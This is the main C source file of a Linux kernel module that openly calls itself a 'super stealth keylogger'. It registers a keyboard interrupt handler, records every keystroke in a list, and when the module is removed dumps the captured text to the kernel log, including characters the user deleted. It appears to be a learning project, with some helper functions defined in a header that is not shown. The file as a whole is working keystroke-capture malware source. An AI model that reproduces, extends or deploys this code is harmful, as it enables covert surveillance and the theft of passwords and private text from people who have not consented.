#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/init.h>
#include <linux/list.h>
#include <linux/slab.h>
#include "keylogger.h"

MODULE_LICENSE("GPL");
MODULE_AUTHOR("Thomas Vermeilh <thomas.vermeilh@gmail.com>");
MODULE_DESCRIPTION("Keylogger module");
MODULE_VERSION("0.1");

/* The global structure */
struct keylogger keylogger = {
	.lock = __MUTEX_INITIALIZER(keylogger.lock),
	.entries = LIST_HEAD_INIT(keylogger.entries),
};

static int __init hello_init(void)
{
	int error = 0;

	printk(KERN_INFO "Super stealth keylogger module starts !\n");

	error = ft_create_dev_file();
	if (error) {
		printk(KERN_ERR "Creating misc device failed.\n");
		return error;
	}

	if (init_keylogger_irq(&keylogger)) {
		printk(KERN_ERR "Registering irq handler failed.\n");
		return -EIO;
	}

	return error;
}

/*
 * Parse the keylogger entries list and print everything to the kernel log
 * in a human friendly way
 */
static void write_entries_to_log(void)
{
	struct keylogger_entry	*e;
	bool			shift = 0;

	mutex_lock(&keylogger.lock);

	printk(KERN_INFO "The user typed :\n");
	list_for_each_entry(e, &keylogger.entries, list) {

		if (strncmp(e->key.name, "Shift", 5) == 0) {
			shift = !e->released;
			continue;
		}

		/* Don't care about released key here */
		if (e->released)
			continue;
		if (strncmp(e->key.name, "Backspace", KEYNAME_LEN) == 0)
			/* User pressed backspace but we still want to log
			 * what he deleted so we write a '<' instead */
			printk(KERN_CONT "<");
		else if (strncmp(e->key.name, "Enter", KEYNAME_LEN) == 0)
			printk(KERN_CONT "\n");
		else if (e->key.ascii != ASCII_UNDEFINED)
			printk(KERN_CONT "%c",
				shift ? e->key.ascii_uppercase : e->key.ascii);
	}
	mutex_unlock(&keylogger.lock);
}

static void __exit hello_cleanup(void)
{
	struct keylogger_entry	*entry;

	printk(KERN_INFO "Cleaning up keylogger module.\n");

	free_keylogger_irq(&keylogger);
	ft_delete_dev_file();

	write_entries_to_log();

	/* Free the entries */
	mutex_lock(&keylogger.lock);
	while (!list_empty(&keylogger.entries)) {
		entry = list_first_entry(&keylogger.entries,
			struct keylogger_entry, list);
		list_del(&entry->list);
		kfree(entry);
	}
	mutex_unlock(&keylogger.lock);

	printk(KERN_INFO "Module removed\n");
}

module_init(hello_init);
module_exit(hello_cleanup);
